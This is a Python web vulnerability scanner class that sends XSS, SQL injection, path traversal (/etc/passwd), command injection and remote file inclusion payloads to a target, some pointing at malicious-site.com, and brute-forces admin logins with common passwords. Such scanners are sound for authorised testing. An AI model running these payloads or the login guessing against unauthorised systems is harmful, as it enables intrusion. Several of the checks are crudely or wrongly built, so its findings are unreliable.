import requests
import json

class VulnerabilityScanner:
    def __init__(self):
        self.vulnerabilities = []

    def scan(self, target_url):
        self.target_url = target_url
        self.scan_xss()
        self.scan_sql_injection()
        self.scan_directory_traversal()
        self.scan_command_injection()
        self.scan_server_misconfiguration()
        self.scan_weak_passwords()
        self.scan_network_vulnerabilities()
        self.scan_web_application_security()
        return self.report_vulnerabilities()

    def scan_xss(self):
        self.check_xss_stored()
        self.check_xss_reflected()

    def check_xss_stored(self):
        payload = "<script>alert('Stored XSS')</script>"
        response = requests.post(self.target_url, data={"comment": payload})
        if payload in response.text:
            self.vulnerabilities.append("Stored XSS vulnerability found")

    def check_xss_reflected(self):
        payload = "<script>alert('Reflected XSS')</script>"
        response = requests.get(self.target_url + "?message=" + payload)
        if payload in response.text:
            self.vulnerabilities.append("Reflected XSS vulnerability found")

    def scan_sql_injection(self):
        self.check_sql_injection_get()
        self.check_sql_injection_post()

    def check_sql_injection_get(self):
        payload = "' OR '1'='1"
        response = requests.get(self.target_url + "?id=" + payload)
        if "error" in response.text:
            self.vulnerabilities.append("SQL injection vulnerability found (GET)")

    def check_sql_injection_post(self):
        payload = "' OR '1'='1"
        response = requests.post(self.target_url, data={"id": payload})
        if "error" in response.text:
            self.vulnerabilities.append("SQL injection vulnerability found (POST)")

    def scan_directory_traversal(self):
        payload = "../../../../etc/passwd"
        response = requests.get(self.target_url + payload)
        if "root:x" in response.text:
            self.vulnerabilities.append("Directory traversal vulnerability found")

    def scan_command_injection(self):
        payload = "127.0.0.1; ls"
        response = requests.get(self.target_url + "?ip=" + payload)
        if "index.html" in response.text:
            self.vulnerabilities.append("Command injection vulnerability found")

    def scan_server_misconfiguration(self):
        response = requests.get(self.target_url + "/admin")
        if response.status_code == 200:
            self.vulnerabilities.append("Server misconfiguration vulnerability found")

    def scan_weak_passwords(self):
        usernames = ["admin", "root"]
        passwords = [
            "admin",
            "root", 
            "password", 
            "123456", 
            "password123",
            "12345678",
            "qwerty",
            "admin123",
            "root123",
            "adminadmin",
            "rootroot",
            "111111",
            "123123",
            ]
        for username in usernames:
            for password in passwords:
                response = requests.post(self.target_url + "/login", data={"username": username, "password": password})
                if "Login successful" in response.text:
                    self.vulnerabilities.append("Weak password vulnerability found")

    def scan_network_vulnerabilities(self):
        self.check_open_ports()
        self.check_insecure_cookies()

    def check_open_ports(self):
        open_ports = []
        for port in range(1, 100):
            try:
                response = requests.get(f"http://{self.target_url}:{port}", timeout=0.5)
                open_ports.append(port)
            except requests.exceptions.RequestException:
                pass
        if open_ports:
            self.vulnerabilities.append(f"Open ports found: {open_ports}")

    def check_insecure_cookies(self):
        session = requests.Session()
        response = session.get(self.target_url)
        cookies = session.cookies
        for cookie in cookies:
            if not cookie.secure:
                self.vulnerabilities.append("Insecure cookie vulnerability found")

    def scan_web_application_security(self):
        self.check_cross_site_request_forgery()
        self.check_remote_file_inclusion()

    def check_cross_site_request_forgery(self):
        payload = "<img src='http://malicious-site.com/transfer?amount=1000'>"
        response = requests.post(self.target_url, data={"name": "John", "comment": payload})
        if "Transfer successful" in response.text:
            self.vulnerabilities.append("Cross-Site Request Forgery (CSRF) vulnerability found")

    def check_remote_file_inclusion(self):
        payload = "http://malicious-site.com/malicious-script.php"
        response = requests.get(self.target_url + "?file=" + payload)
        if "Sensitive information leaked" in response.text:
            self.vulnerabilities.append("Remote File Inclusion (RFI) vulnerability found")

    def report_vulnerabilities(self):
        return json.dumps({"target_url": self.target_url, "vulnerabilities": self.vulnerabilities})
